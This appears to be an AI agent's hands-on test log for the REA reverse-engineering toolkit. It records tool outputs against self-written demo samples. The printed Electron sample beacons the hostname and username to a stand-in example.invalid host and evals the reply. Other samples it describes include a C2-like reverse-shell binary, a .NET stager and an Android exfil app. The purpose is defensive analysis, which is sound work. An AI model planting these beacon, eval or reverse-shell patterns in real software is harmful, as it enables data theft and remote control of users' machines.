# 27 — Manual test log (everything I executed, how to reproduce it, what it showed)

This documents every hands-on test run while writing this deep-dive, so each RUN claim in [26](26-tool-usage-in-context-malware-analyst-view.md) and [28](28-vulnerability-research-with-rea.md) can be checked. Files: [manual-tests/run-all.sh](manual-tests/run-all.sh) (one-shot reproduction), [manual-tests/samples/](manual-tests/samples/) (all demo source), [manual-tests/outputs/](manual-tests/outputs/) (raw REA JSON from the final reproduction run).

**Scope statement.** These are *functional checks of REA's static/offline tools against tiny benign demo programs I wrote.* They are not a security evaluation of REA, not a detection benchmark, and no real malware was used. The only code executed was my own demo vulnerable C program, run once with an oversized argument to produce a core file (T10); every other test only read files.

## 1. Environment (as run)
| Item | Value |
|---|---|
| Host | Linux x86-64 container (kernel 6.18), root user, no GUI |
| REA | `morluto/rea` HEAD `f75b1a4`, package `rea-agents` 6.4.0 (shallow clone) |
| Node | v22.22.0 (REA needs `^22.19 \|\| ^24.11 \|\| >=26`) |
| Compilers/tools | gcc 13.3.0, go 1.24.7, GNU objdump 2.42, zip, gdb (used only for my own cross-check), util-linux `prlimit` |
| Python | system python3 + `pip install pwntools` (installed pwntools 4.15.0, pyelftools 0.33.0, unicorn 2.1.2 — exactly the versions REA's docs require for `inspect_binary_layout`) |
| NOT available | Ghidra, Hopper, IDA, Rizin, Cutter, .NET SDK, JADX, tshark, Frida, Binwalk/Unblob, WABT, sigrok, a Chrome browser, Node ≥ 24.15 (needed by `inspect_sqlite_database`) |

## 2. Setup performed and the problems met (kept honestly)
| # | Step | Command | Result |
|---|---|---|---|
| S1 | Clone | `GIT_LFS_SKIP_SMUDGE=1 git clone --depth 1 https://github.com/morluto/rea` | OK |
| S2 | Install deps | `npm ci --ignore-scripts` | OK (387 packages) |
| S3 | Standard build | `npm run build:cached` | **Failed**: `Could not verify the installed direct dependencies: ENOENT … node_modules/.package-lock.json` (a side effect of `--ignore-scripts`/environment; REA's `check-dependency-install` guard) |
| S4 | Workaround compile | `npx tsc -p tsconfig.build.json` | OK → `dist/` has tsc output |
| S5 | CLI attempt | `node dist/cli.js analyze-javascript-application … --json` | **Empty output**: `scripts/rea.mjs` expects bundled `dist/cli-runtime/` and `dist/mcp/` |
| S6 | Bundle | `node scripts/bundle-runtime.mjs` | OK (warnings `INEFFECTIVE_DYNAMIC_IMPORT` only). Afterwards `node scripts/rea.mjs <command>` works. (The chapter-02/03 writer also used `node dist/main.js` over stdio for live MCP transcripts — see [03](03-mcp-server-runtime-and-contracts.md) "LIVE" sections) |
| S7 | Generate catalogs | `node scripts/generate-product-catalog.mjs`, `node scripts/generate-mcp-tool-catalog.mjs` | OK → `docs/public/product-catalog.json`, `.cache/mcp-tool-catalog.json` (207 tools); source of [catalog/](catalog/) and [tool-specs/](tool-specs/) |
| S8 | Extra dependency | `pip install pwntools` | OK; exported `REA_PWNTOOLS_PYTHON=$(which python3)` for the layout/crash tools |

Two CLI input-shape lessons (both produced a structured REA error, useful to know when scripting):
- `trace-application-feature` initially failed with `invalid_request … application.kind unknown_argument / application.evidence missing…` because I wrapped Evidence as `{kind:"inline", evidence:…}`. For that command `application` must be **the raw Evidence object** (or `{evidence_id, kind:"retained-evidence"}` over MCP). `inspect-analysis-view` instead takes `source:{kind:"inline", evidence:<record>}`. Always check `rea <cmd> --schema`.
- `rea` progress lines (`{"rea_progress":…}`) go to stderr; JSON Evidence to stdout.

## 3. Demo samples (all in [manual-tests/samples/](manual-tests/samples/))
| Sample | File(s) | Purpose / planted patterns (all inert) |
|---|---|---|
| Mock Electron "updater" v1 | `samples/jsapp-v1/{package.json, index.html, src/main.js, config.js, net.js, preload.js}` | `nodeIntegration:true`; `ipcMain.handle('run-task', … exec(cmd))`; preload exposes `api.run` via `contextBridge`; base64 config literal; `setInterval → https.request → eval(response)` to an `example.invalid` URL |
| Mock Electron v2 ("patched") | `samples/jsapp-v2-diff/main.js` replaces v1 `src/main.js` | `nodeIntegration:false, contextIsolation:true, sandbox:true`; handler validates `event.senderFrame.url` and allow-lists commands, uses `execFileSync` |
| Go program | `samples/go-main.go` | `http.Get("https://c2.example.invalid/cfg")`, `exec.Command("whoami")` (built, never run) |
| C "C2-like" | `samples/c2-like.c` | `ptrace(PTRACE_TRACEME)` anti-debug, `socket/connect` to `198.51.100.7:4444` (TEST-NET), `dup2` (built, never run) |
| Vulnerable C | `samples/vuln.c` | `strcpy` into a 32-byte stack buffer and `gets()`; built twice (weak / hardened) |
| EVM bytecode | `samples/evm.hex` | Hand-written dispatcher fragment comparing selectors `0xa9059cbb` and `0x70a08231` |

Build flags (from `run-all.sh`): weak = `gcc -O0 -fno-stack-protector -z execstack -no-pie -Wl,-z,norelro`; hardened = `gcc -O2 -fstack-protector-strong -fPIE -pie -Wl,-z,relro,-z,now -D_FORTIFY_SOURCE=2`. Zip = `zip -r sample.zip jsapp1`.

Key v1 source (verbatim) used by T1–T5:
```js
// src/main.js (v1)
const { app, BrowserWindow, ipcMain } = require('electron');
const { exec } = require('child_process');
const path = require('path');
const { loadConfig } = require('./config');
const { beacon } = require('./net');
app.whenReady().then(() => {
  const win = new BrowserWindow({ webPreferences: { preload: path.join(__dirname, 'preload.js'), nodeIntegration: true } });
  win.loadFile('index.html');
  beacon(loadConfig());
});
ipcMain.handle('run-task', (event, cmd) => new Promise((res) => exec(cmd, (e, out) => res(out))));
```
```js
// src/net.js (v1)
const https = require('https');
const os = require('os');
exports.beacon = (cfg) => setInterval(() => {
  const body = JSON.stringify({ host: os.hostname(), user: os.userInfo().username });
  const req = https.request(cfg.url, { method: 'POST' }, (res) => { let d=''; res.on('data', c => d += c); res.on('end', () => eval(d)); });
  req.write(body); req.end();
}, cfg.interval);
```

## 4. Test cases
Notation: **Input → Command → Observed → Meaning → Verified/Caveat**. Raw JSON for each is in `manual-tests/outputs/`.

| ID | Tool (MCP name / CLI) | Input | Observed (real values) | Meaning / caveat |
|---|---|---|---|---|
| T1 | `analyze_javascript_application` / `analyze-javascript-application` | `jsapp1` dir | Evidence `rea.javascript-application-analysis`; root SHA-256 `d9bf8b225947e2f579a79d0c47f233d89009a650f1b4b24b74f5b5f81e4e61de` (identical on two separate runs → deterministic for directories); graph **36 nodes/48 edges**; semantic graph 248 nodes/202 relations/11 fingerprints/91 unknowns; statistics: 6 relevant files, 4 parsed, 274 AST nodes, 0 parse failures, 27 findings; summary: `explicit_web_preferences 2`, `ipc.operations 2`, `sender_validation_observations 0`; `confidence: derived`; 7 limitations | Full JS app fingerprint without execution. Output is large (559 KB for 6 files) — see summary-first advice |
| T1b | same | `jsapp2` dir | graph 36/48; `explicit_web_preferences 4`, `sender_validation_observations 1` | The patched version's hardening is visible as counters |
| T2 | `inspect_analysis_view` | T1 Evidence inline, `view:{kind:"summary"}` | New Evidence (provider `rea-analysis-view`), 11.5 KB, `coverage complete-within-view examined 22/36`, parent link | Cheap re-projection of a big record |
| T3 | `inspect_analysis_view` | `view:{kind:"page",collection:"modules",offset:0,limit:5}` | 5 items `{node_id, kind, path}` | Paging handles |
| T4 | `trace_application_feature` / `trace-application-feature` | seed `{kind:module, value:"src/net.js"}`, direction both | 2 seed matches; 36 nodes/48 edges; **1 terminal path** renderer-bridge `api.run` → channel `run-task` → `electron.ipcRenderer.invoke`; main `ipc-handler` at **line 11, col 27–96**; summary observed 31 / inferred 57 / unknown 0 / native_handoffs 0; coverage `complete-within-source` | Surfaces the page→main command bridge. Real |
| T4b | semantic nodes in T1 | (read from T1 JSON) | `child-process exec` with `command:null`; `request` with `endpoint:null`; `timer setInterval` with `delay:null`; literal `aHR0cHM6Ly9jMi5leGFtcGxlLmludmFsaWQvdGFzaw==`; `eval` and `Buffer` only generic `expression` nodes; relation kinds include `spawns, schedules-timer, constructs-request, supplies-request-field, registers-listener` | Dynamic args stay unresolved; no "dangerous sink" labels |
| T5 | `compare_application_versions` / `compare-application-versions` | `{left: T1, right: T1b}` (raw Evidence objects) | `summary: unchanged 17, added 16, removed 16, changed 3, unknown 0`; `matching: exact_node_identity 12, exact_content_digest 5, semantic_key 3, unmatched 32`; changed: `javascript-asset` (content, properties), `ipc-channel` (location), `electron-preload` (location); **added+removed** pairs for `ipc-handler`, `browser-window`, `electron-renderer` and 12 modules; confidence `inferred`; limitation "never uses bundler module ordinals… performs no fuzzy pairing". Output byte-identical across two runs (288,158 B) | Because identity is by content digest, an edited file appears as removed+added, not "changed". Use the summary counters (T1 vs T1b) and traces to interpret the security delta |
| T6 | `inspect_go_binary` | Go ELF | `elf amd64`, `go_version go1.24.7`, header offset 5435392, module path `beacon`, no dependencies, settings `-buildmode=exe -compiler=gc CGO_ENABLED=1 GOARCH=amd64 GOOS=linux GOAMD64=v1`; `confidence observed`; 3 limitations incl. "function names… not recovered" | Toolchain/module fingerprint |
| T7 | `inspect_artifact` | `sample.zip` | provider `rea-artifact-graph`; manifest root format `zip`; **node_count 9, occurrence_count 9, edge_count 8**; `integrity_policy:fail`; 1 observation, 0 hypotheses/contradictions/next_probes; coverage `complete-within-substeps` | Archive inventory with identity |
| T8 | `inspect_with_objdump` op `symbols` | C2-like ELF | provider `gnu.objdump` (version unknown), `observed`; raw stdout lists undefined `connect, ptrace, dup2, inet_pton, htons, puts…`; command args `-t <path>`; limitations incl. "version… reported as unknown" | Engine-free import triage |
| T9a/b | `inspect_binary_layout` | weak / hardened ELF (needs pwntools) | weak: `position_independent:false, executable_stack_indicator:true, stack_canary_indicator:false, relro:null, nx_indicator:null`; hardened: `position_independent:true, nx_indicator:true, executable_stack_indicator:false, stack_canary_indicator:true, relro:"Full"`; both `evidence_kind:"inferred"`; symbols include `gets`, `strcpy` (weak) vs `__strcpy_chk`, `__printf_chk`, `gets` (hardened); `relocation_inventory_completeness: unknown`; runtime load base null | checksec-style mitigation read-out + risky imports, offline. `relro:null` on weak = REA reports no RELRO indicator (not "Partial") |
| T10 | `inspect_recorded_crash` | core from `weak` run with 200×`A` argument (core 462 KB) | `target_execution:"not-performed"`, `live_process_identity:"unknown"`; 24 segments, 8 notes; 1 thread; `recorded_current_signal 11`; registers incl. **`rip 0x4011b6`, `rbp 0x4141414141414141`, `rsp 0x7ffca9b88898`**; signal record `number 11, code 128, fault_address null, thread_association unknown`; `debugger: not-requested` | Crash triage without attaching. **My cross-check (not REA):** `gdb -batch` on the same core shows `#0 0x4011b6 in greet ()`, `=> ret`, "terminated with signal SIGSEGV" — consistent |
| T11 | `inspect_evm_interface` | `evm.hex`, encoding `hex` | provider `evmole-interface`, `inferred`; functions `0xa9059cbb` (offset 22) and `0x70a08231` (offset 24), `dispatch:"abi"`, args `""`, mutability `payable`; worker limits recorded (3 GiB address space, 30 s CPU) | Selector recovery; arguments/mutability are inferences (and meaningless for my handmade bytes) |

## 5. Reproducibility results
- Re-ran the whole of [run-all.sh](manual-tests/run-all.sh) from scratch in a clean directory: **31 s**, all 11 tests produced output. Compare with the first manual runs: T4 trace output 144,672 B identical; T5 compare output 288,158 B identical; JS directory SHA-256 `d9bf8b22…` identical.
- **Not byte-reproducible:** binary SHA-256s change on every rebuild (Go build IDs / paths; e.g. `beacon` was `774c4cc4…` in the first run and `2c6c3a12…` in the second), and result JSON embeds the absolute input path, so sizes differ by a few bytes between directories. Binary hashes of the final run are in [outputs/binary-hashes.txt](manual-tests/outputs/binary-hashes.txt). Binaries and the core file are deliberately **not committed**; rebuild with the script.

## 6. Documented but **not** tested here (so treat as unverified)
| Area | Tools | Why not run |
|---|---|---|
| Deep native (flow B in [26]) | `open_binary`, `binary_overview`, `analyze_function`, `xrefs`, `trace_call_path`, `trace_native_values`, `batch_decompile`, `set_*` | No Ghidra/Hopper/IDA installed |
| .NET | `inspect_managed_*`, `compare_managed_members` | No .NET sample/toolchain |
| Android | `inspect_android_*`, `search_android_classes`, `trace_android_references`, `decode_android_resources` | No JADX/Apktool/APK |
| Network | `inspect_pcap_capture`, `inspect_packet_capture`, `inspect_web_network_capture` | No tshark / captures |
| Runtime | `capture_process_scenario`, Frida tools, GDB/Rizin/Cutter, browser/Electron scenarios, ADB | Execution-class; no isolated lab here |
| Other | `inspect_sqlite_database` (needs Node ≥ 24.15), WASM (needs WABT), firmware (Binwalk/Unblob), `inspect_pe_resources`, `inspect_signature`, MCP prompts end-to-end with a real LLM client | Prereqs absent or out of scope |
| Session lifecycle | `record_unknown`, `export/import_evidence_bundle`, comparisons needing live ledger | MCP-only; exercised by the chapter-10/11 writer against `dist/`, not re-run by me |

The chapter-03 writer additionally drove the stdio MCP server (`initialize`, `tools/list`, `open_binary`, `inspect_*`, `get_evidence_bundle`, progress, cancel) — transcripts marked LIVE in [03](03-mcp-server-runtime-and-contracts.md); the chapter-10/11/12 writer rendered the six prompts from the compiled `dist/` and ran Evidence/Unknown/bundle examples ([10](10-evidence-model-ledger-unknowns-bundles.md), [11](11-comparison-snapshots-analysis-view-reconstruction.md), [12](12-ai-layer-prompts-and-skills.md) §12.7).

---

# Part 2 — Lab round (real engines installed; added after "complete all pending")

Part 1 above used only what a bare container offers. Part 2 installs the missing engines and re-runs the previously description-only flows. Artifacts: [manual-tests/run-lab.sh](manual-tests/run-lab.sh) (script), [manual-tests/mcp-driver/drive.mjs](manual-tests/mcp-driver/drive.mjs) (the MCP stdio client I wrote; no LLM involved), [manual-tests/mcp-transcripts/](manual-tests/mcp-transcripts/) (full MCP transcripts t1–t9 + exported Evidence bundle), [manual-tests/steps/](manual-tests/steps/) (the step files that produced them), [manual-tests/outputs/lab-*.json](manual-tests/outputs/) (CLI outputs), extra sample sources under [manual-tests/samples/](manual-tests/samples/).

## 7. Lab installation record
| Component | Version | How obtained here | Notes |
|---|---|---|---|
| Ghidra | 12.1.4 (+ OpenJDK 21.0.12) | GitHub release asset `ghidra_12.1.4_PUBLIC_20260921.zip` (570 MB). The proxy blocks GitHub HTML/API pages but allows asset downloads; I found the exact file name by probing dates | `rea doctor` → ghidra, headless, native decompiler, java all `healthy`; `GHIDRA_INSTALL_DIR=/opt/lab/ghidra_12.1.4_PUBLIC` |
| JADX (headless MCP jar) | jadx-headless-mcp 0.7.1 | GitHub release asset, SHA-256 verified against the value REA documents (`6e5eacf5…ff75`) | `REA_JADX_MCP_JAR` |
| WABT | 1.0.42 | GitHub release `wabt-1.0.42-linux-x64.tar.gz` | apt's 1.0.34 was **rejected** by REA (fail-closed version pin), see L5 |
| Binwalk | 3.1.0 | `cargo install binwalk --version 3.1.0 --locked` | apt's 2.3.4 **fails** (Python traceback) — REA expects 3.1.x |
| Wireshark | tshark/capinfos 4.2.2 | apt | accepted |
| .NET SDK | 8.0 | apt `dotnet-sdk-8.0` | only to build the demo assembly |
| Node | 24.21.0 | `npm i node@24` in a scratch dir | needed only for `inspect_sqlite_database` (REA: ≥ 24.15) |
| Frida | 17.23.2 | `npm rebuild frida` inside the REA checkout (the earlier `npm ci --ignore-scripts` had skipped the binding download) | before the rebuild, REA returned `capability_unavailable … Could not locate the bindings file` |
| Others | aapt, dalvik-exchange, libandroid-23-java (APK build), mingw-w64 (PE build), sqlite3, squashfs-tools, YARA 4.5.0 | apt | build/scan helpers only |
| **Not installed** | Hopper, IDA, Rizin, Cutter, JEB, adb, Apktool, Unblob, sigrok-cli, pwndbg, Wakaru | — | those paths stay DOC |

Network facts learned: apt, npm, PyPI, crates.io and GitHub **release assets** are reachable; github.com HTML/API pages return 403 through the proxy unless a repository is attached.

## 8. Lab test cases (real results)
| ID | What | Real result |
|---|---|---|
| L1 | **Deep native flow with Ghidra over MCP** on the C2-like ELF (`open_binary` provider ghidra → … → `close_binary`; transcript t2.json/t3.json) | `open_binary` 19–333 ms (lazy); first analysis-dependent call `binary_overview` **15–19 s** (cold Ghidra import + auto-analysis), later calls 4–550 ms. Results: image base `0x100000`, document `target-c9c84e179642.bin`; `list_procedures` incl. `main@0x10125b`, `check@0x101229` and external `ptrace/connect/socket/dup2/inet_pton/htons/puts`; **`search_strings "198.51"` → `0x102004 "198.51.100.7"`** (objdump in T8 could not see this string); `xrefs 0x102004` → `0x1012da`, `0x104010`; `resolve_containing_procedure 0x10125b` → `main`, body `0x10125b–0x101339`, 223 bytes; `procedure_callers check` → `0x10125b`; `analyze_function main` returned pseudocode (socket(2,1,0), `htons(0x115c)` (=4444), `inet_pton(2,C2,…)`, `connect`, `dup2(fd,0)`, `puts("/bin/sh -c id")`, stack-canary check) plus assembly, locals, CFG; `batch_decompile [check, main]` → `check` = `ptrace(PTRACE_TRACEME,0,0,0); return lVar1 == -1;`; `inspect_native_api main` (calling convention `__stdcall`, return type `undefined8`, confidence low); `trace_call_path main→check forward` → `goal_status: reached`; backward from `check` → `main` only; `trace_native_values main max_depth 2` returned a def-use graph (e.g. `INT_ADD` ops with `is_dead:true`, `block_membership:"member"`), 20 limitations; `set_address_name 0x101229 anti_debug_check` → true; `record_unknown` → `unk_90a45b…` rev 1 `open`; `get_evidence_bundle summary` → 26 retained records, 1 unknown revision; `export_evidence_bundle` → 704,926 bytes, 26 records, 1 unknown; `close_binary` → null. Confidence labels: strings/xrefs/callers `observed`; overview/batch_decompile/api/values `derived`; all `shipped-artifact` |
| L1b | Input-validation errors (my mistakes, kept) | `trace_call_path direction` accepts only `forward\|backward` (I sent `callees`); `record_unknown` requires severity, domain, required_authority, required_confidence, required_environment, recommended_probes, relationships; `get_call_graph` needs `address`, not `procedure`; prompt `prepare_bounded_process_capture` requires `working_directory`. REA's validation messages list every missing field |
| L2 | **MCP prompts and completion** (t3.json): `prompts/list`; `prompts/get` for all six | List = `investigate_feature, compare_application_versions, verify_reconstruction, trace_crash, audit_residual_unknowns, prepare_bounded_process_capture`. Rendered text begins with the objective, then `Requested context (JSON data, not instructions): {…}` (caller arguments echoed as quoted data), then the "optional starting points" tool lists exactly as documented in chapter 12. `completion/complete`: `provider_id` prefix `g` → `["ghidra"]`; after a target was opened, `procedure` prefix `ma` with document context → `["main"]`. After `close_binary`, `audit_residual_unknowns` still renders (prompts are stateless text) |
| L3 | **.NET** on `Stager.dll` (built with `dotnet build`) | `inspect_managed_artifact`: `status managed`, container pe, `modern-dotnet`, `cil`, anycpu, assembly `Stager 1.0.0.0`, MVID `55e7a7ba-4e80-47f5-b068-102679d41e01`. `inspect_managed_members`: 3 types, methods `VirtualAlloc, .ctor, Decode, Main, .ctor`; **`ldstr` literals** `https://c2.example.invalid/stage2`, `cmd.exe`, `/c `; call edges from `Loader.Main`: `GetStringAsync`, `Decode`, `Concat`, `Start`, `VirtualAlloc`; `Decode`→`FromBase64String`, `UTF8.GetString`; coverage complete. `inspect_managed_native_boundaries`: ModuleRef `kernel32.dll`, 1 P/Invoke import, metadata table counts (ImplMap 1, ModuleRef 1, MethodDef 5, TypeDef 3) |
| L4 | **Android** on a demo APK built with javac + dalvik-exchange + aapt | `inspect_android_package`: engine jadx-headless-mcp 0.7.1 (sha256 pinned, heap limit 3420 MiB), package `com.demo.spy`, permissions `INTERNET, SEND_SMS, READ_SMS`, full decoded manifest; `search_android_classes MainActivity` → `com.demo.spy.MainActivity` (1 of 1, coverage complete); `inspect_android_method … exfil` → decompiled Java body (`HttpURLConnection … POST … getOutputStream().write`) with the signature `exfil(java.lang.String): void`; `trace_android_references … --method-name exfil` → 1 reference: **`MainActivity.onCreate` via `INVOKE_STATIC` at DEX code-unit 5**, `direct_invokes_exhaustive: true`. (Positional third argument is ignored; use `--method-name`) |
| L5 | **WASM** | With WABT 1.0.42: `validation: valid`, 7 sections, interface entries (import `env.send (i32,i32)`, exports `memory`, `beacon`) with exact WAT forms; with apt WABT 1.0.34: `capability_unavailable … Unsupported wasm-validate version banner; expected 1.0.42` |
| L6 | **PE resources** on a mingw-built `demo.exe` with an RCDATA blob | Resource `type 10 (RCDATA) name "PAYLOAD"` lang 1033, payload RVA 45232, file offset 15024, **33 bytes (= my payload length)**, SHA-256 `7694ba85…bdb4f1`; plus `RT_VERSION` (type 16) 408 bytes; `confidence observed` |
| L7 | **SQLite** (Node 24.21) | engine SQLite 3.53.4, UTF-8, schema inventory (tables `cookies`, `settings`), selected-table schema + bounded rows; the same tool refuses on Node 22 (requirement) |
| L8 | **Firmware** | With binwalk 3.1.0: region `squashfs` at **offset 4096** (the 4 KiB random pad before it was skipped), reported size 2986, `size_basis: provider_reported_validation_unknown`, coverage `signature_scan`; with binwalk 2.3.4: `execution_failure` (Python traceback) |
| L9 | **PCAP** on a tshark loopback capture of my beacon-like requests | `inspect_pcap_capture`: pcapng, 24 packets, one endpoint 127.0.0.1, protocols incl. `http` and `urlencoded-form`, **HTTP URIs `http://127.0.0.1:8765/beacon?id=42&host=lab` and `…/task`**, no DNS/SNI (loopback), coverage complete, tshark 4.2.2. `inspect_packet_capture --fields … --display_filter http.request` → per-packet `ip.src, ip.dst, http.request.uri, http.user_agent` (`UpdaterBot/1.0`) |
| L10 | **Process capture (tier D, disposable container, benign demo)** | `capture-process` of the hardened demo with `hello`: exit `{code 0, signal 0}`, terminal frame `hello hello`, isolation `process`, authority `controlled-replay`, cleanup `owned_process_group verified, temporary_root removed`; the crash run (weak build, 200×A): exit `{code 0, signal 11}`, terminal shows the oversized echo. **Observation:** two captures of the *same* scenario compare as `changed` (terminal `at_ms` 20 vs 10 with the default 10 ms time bucket); with `time_bucket_ms:1000` the terminal dimension becomes `unchanged` but `exit` and `filesystem` still report `changed` with `first_divergence` at a filesystem checkpoint (129 vs 118 ms). The comparison is strict; use the first_divergence record and a `trace_spec` when comparing runs |
| L11 | **Frida 17.23.2** | `list_frida_devices` → local, socket, barebone. `instrument_with_frida` **attach** to a running `sh` loop, script hooking libc `write/fork/vfork/execve/nanosleep`: messages `{call:"write"}`, `{call:"vfork"}`, `{call:"execve"}` received. **Spawn mode** (`start_frida_session` paused → `load_frida_script` → `resume_frida_session`): lifecycle states `paused → running → detached` worked and the target did run (a spawned `touch` created its file), but hooks installed before resume (via `Module.getGlobalExportByName`) delivered no call messages — **unexplained here** (likely libc not yet loaded at the spawn-time attach point); attach mode is the reliable recipe. Script API note: Frida 17 removed `Module.findExportByName` (my first script failed with `TypeError: not a function`) |
| L12 | **YARA 4.5.0** as the signature layer | Two demo rules matched the C2-like ELF (string + imports) and the Electron `main.js`; see [prototype/rea-triage](prototype/rea-triage/README.md) |
| L13 | **rea-triage prototype** over the Evidence from the tests | 19 Evidence records → 11 rule findings + 8 IOCs, each citing Evidence IDs (base64-decoded JS C2 URL, .NET ldstr URL, Ghidra string `198.51.100.7`, PE RCDATA hash, pcap URIs, Go module) |
| L14 | **Upstream drift check** (P10) | Fresh shallow clone of `morluto/rea` HEAD `eab789a` (package 6.5.0, 2026-10-14) vs analysed `f75b1a4` (package.json 6.4.0; its CHANGELOG already describes 6.5.0): **18 non-test files under `src/` differ, all in managed-member comparison (nominal signatures across builds) plus the generated version file**; the differing set includes `src/contracts/managed/managedWorkflowToolContracts.ts` and its examples, so a managed-tool schema detail may have changed (I did not diff its semantics); no other contract, provider or CLI file differs. Counts in this doc (207/47/25) were generated from `f75b1a4` |

## 9. Reproducibility of Part 2
`run-lab.sh` rebuilds all samples and re-runs L1, L3–L11 against a built REA checkout. First full execution attempt was **killed partway (exit 144) at the Android step while six verification/writing subagents were running** — the container was running Ghidra, JADX and headless-browser processes concurrently, so I attribute the kill to resource contention (**INFERRED**; I did not capture dmesg). See [29](29-pending-and-status.md) for the re-run status.
